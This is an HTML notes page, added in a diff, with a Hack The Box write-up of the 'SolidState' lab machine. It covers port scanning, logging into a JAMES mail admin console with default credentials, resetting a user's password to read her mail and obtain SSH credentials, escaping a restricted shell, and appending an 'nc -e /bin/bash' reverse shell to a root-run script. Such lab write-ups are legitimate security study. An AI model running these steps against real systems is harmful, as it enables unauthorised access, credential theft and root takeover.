@@ -1,0 +1,677 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.8">
+    
+    
+      
+        <title>Solidstate - Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.cb6bc1d0.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.39b8e14a.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ff6e42">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-orange" data-md-color-accent="green">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#solidstate" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../.." title="Notes" class="md-header-nav__button md-logo" aria-label="Notes">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            Notes
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              Solidstate
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Notes" class="md-nav__button md-logo" aria-label="Notes">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" data-md-state="indeterminate" type="checkbox" id="nav-2" checked>
+      
+      <label class="md-nav__link" for="nav-2">
+        Shells
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Shells" data-md-level="1">
+        <label class="md-nav__title" for="nav-2">
+          <span class="md-nav__icon md-icon"></span>
+          Shells
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../shells/reverse/" class="md-nav__link">
+        Reverse Shells
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../shells/remote/" class="md-nav__link">
+        Remote Access
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../shells/webshells/" class="md-nav__link">
+        Web Shells
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" data-md-state="indeterminate" type="checkbox" id="nav-3" checked>
+      
+      <label class="md-nav__link" for="nav-3">
+        WebApps
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="WebApps" data-md-level="1">
+        <label class="md-nav__title" for="nav-3">
+          <span class="md-nav__icon md-icon"></span>
+          WebApps
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../webapps/php/" class="md-nav__link">
+        PHP
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
+      
+      <label class="md-nav__link" for="nav-4">
+        HTB
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="HTB" data-md-level="1">
+        <label class="md-nav__title" for="nav-4">
+          <span class="md-nav__icon md-icon"></span>
+          HTB
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nineveh/" class="md-nav__link">
+        Nineveh
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sense/" class="md-nav__link">
+        Sense
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Solidstate
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Solidstate
+      </a>
+      
+        
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-25-4555" class="md-nav__link">
+    Port 25 / 4555
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-mindy" class="md-nav__link">
+    Shell as mindy
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege escalation
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="solidstate">SolidState</h1>
+<ul>
+<li>Linux</li>
+<li>Medium</li>
+</ul>
+<h2 id="recon">Recon</h2>
+<ul>
+<li>Nmap
+    <div class="highlight"><pre><span></span><code>Nmap scan report for 10.129.29.189
+Host is up (0.043s latency).
+Scanned at 2021-02-18 22:33:54 CET for 418s
+Not shown: 65528 closed ports
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z
+|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE=
+|   256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY
+25/tcp    open     smtp?
+|_smtp-commands: Couldn&#39;t establish connection on port 25
+80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Home - Solid State Security
+110/tcp   open     pop3?
+119/tcp   open     nntp?
+4555/tcp  open     rsip?
+18683/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></li>
+</ul>
+<h2 id="port-25-4555">Port 25 / 4555</h2>
+<ul>
+<li>
+<p>JAMES Remote Administration Tool 2.3.2 -&gt; James Mail Server</p>
+<ul>
+<li>Creds root:root (Default creds)</li>
+<li>We log in to check users and reset their passwords, looking for reading their mail.</li>
+</ul>
+<div class="highlight"><pre><span></span><code>╰─❯ telnet 10.129.29.189 4555
+Trying 10.129.29.189...
+Connected to 10.129.29.189.
+Escape character is &#39;^]&#39;.
+JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+Login id:
+root
+Password:
+root
+Welcome root. HELP for a list of commands
+setpassword mindy pass1234
+Password for mindy reset
+</code></pre></div>
+<ul>
+<li>We have luck with mindy's mail.</li>
+</ul>
+<div class="highlight"><pre><span></span><code>╰─❯ telnet 10.129.29.189 110
+Trying 10.129.29.189...
+Connected to 10.129.29.189.
+Escape character is &#39;^]&#39;.
+USER mindy
+PASS pass1234
+LIST
++OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
++OK
++OK Welcome mindy
++OK 2 1945
+1 1109
+2 836
+.
+RETR 1
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;5420213.0.1503422039826.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 ([192.168.11.142])
+        by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
+        for &lt;mindy@localhost&gt;;
+        Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
+Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
+From: mailadmin@localhost
+Subject: Welcome
+
+Dear Mindy,
+Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.
+
+We are looking forward to you joining our team and your success at Solid State Security. 
+
+Respectfully,
+James
+.
+RETR 2
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 ([192.168.11.142])
+        by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
+        for &lt;mindy@localhost&gt;;
+        Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+From: mailadmin@localhost
+Subject: Your Access
+
+Dear Mindy,
+
+
+Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
+Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
+
+username: mindy
+pass: P@55W0rd1!2@
+
+Respectfully,
+James
+</code></pre></div>
+<ul>
+<li>There is also an <a href="https://www.exploit-db.com/exploits/35513">exploit</a> but it needs user interaction.</li>
+</ul>
+</li>
+</ul>
+<h2 id="shell-as-mindy">Shell as mindy</h2>
+<ul>
+<li>
+<p>We log with the creds <code>mindy:P@55W0rd1!2@</code> on SSH. But we find we are in a restricted shell
+    <img alt="" src="../images/solidstate_rbash.png" /></p>
+<ul>
+<li>After trying several bypasses (from <a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf">here</a>), we find that we can log with noprofile on bash.
+<div class="highlight"><pre><span></span><code>╰─❯ ssh mindy@10.129.29.189 -t &#39;bash --noprofile&#39;  
+mindy@10.129.29.189&#39;s password: 
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
+uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
+</code></pre></div></li>
+</ul>
+</li>
+</ul>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p>Now with an interactive shell, we enumerate to find a possible privilege escalation.</p>
+<ul>
+<li>With pspy we find that user root are executing <code>/opt/tmp.py</code>. We have write permissions over this file.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="si">${</span><span class="nv">debian_chroot</span><span class="p">:+(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="si">}</span>mindy@solidstate:/opt$ ls -ld tmp.py 
+-rwxrwxrwx <span class="m">1</span> root root <span class="m">248</span> Feb <span class="m">18</span> <span class="m">17</span>:33 tmp.py
+</code></pre></div>
+<ul>
+<li>Adding our reverse shell to script</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="err">$</span><span class="p">{</span><span class="n">debian_chroot</span><span class="p">:</span><span class="o">+</span><span class="p">(</span><span class="err">$</span><span class="n">debian_chroot</span><span class="p">)}</span><span class="n">mindy</span><span class="nd">@solidstate</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="err">$</span> <span class="n">echo</span> <span class="s2">&quot;os.system(&#39;nc -e /bin/bash 10.10.14.58 5555&#39;)&quot;</span> <span class="o">&gt;&gt;</span> <span class="n">tmp</span><span class="o">.</span><span class="n">py</span>
+<span class="err">$</span><span class="p">{</span><span class="n">debian_chroot</span><span class="p">:</span><span class="o">+</span><span class="p">(</span><span class="err">$</span><span class="n">debian_chroot</span><span class="p">)}</span><span class="n">mindy</span><span class="nd">@solidstate</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="err">$</span> <span class="n">cat</span> <span class="n">tmp</span><span class="o">.</span><span class="n">py</span> 
+<span class="c1">#!/usr/bin/env python</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;rm -r /tmp/* &#39;</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;nc -e /bin/bash 10.10.14.58 5555&#39;</span><span class="p">)</span>
+</code></pre></div>
+<ul>
+<li>Root reverse shell</li>
+</ul>
+<p><img alt="" src="../images/solid_root.png" /></p>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../sense/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Sense
+              </div>
+            </div>
+          </a>
+        
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.18f0862e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.994580cf.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: ['navigation.expand', 'toc.integrate'],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.9c0e82ba.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
